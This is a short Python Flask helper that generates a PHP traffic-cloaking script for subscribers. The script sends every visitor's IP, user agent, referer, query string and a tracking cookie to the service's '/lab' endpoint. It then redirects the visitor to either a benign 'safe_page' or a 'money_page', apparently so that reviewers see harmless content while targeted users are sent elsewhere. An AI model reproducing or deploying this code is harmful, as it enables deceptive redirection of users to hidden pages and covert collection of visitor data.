from flask import request


def get_php(member_id, subscription_id):
    sr = """
    <?php error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");$id = "%s";$uid="%s";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$url = "http://%s/lab";
$data=array("lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL, $url);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$a12 = json_decode($result, true);$a13 = $a12['results'][0];if(!empty($a13['safe_page'])){if( $a13['safe_page'] != $_SERVER["SERVER_NAME"]){@header("location: ".$a13['user_safe_page'], TRUE, 301);}}if( !empty($a13['money_page'])){@header("location: ".$a13['user_money_page'], TRUE, 301);}
?>
    """ % (str(subscription_id), str(member_id), str(request.host))
    return bytes(sr, 'utf-8')

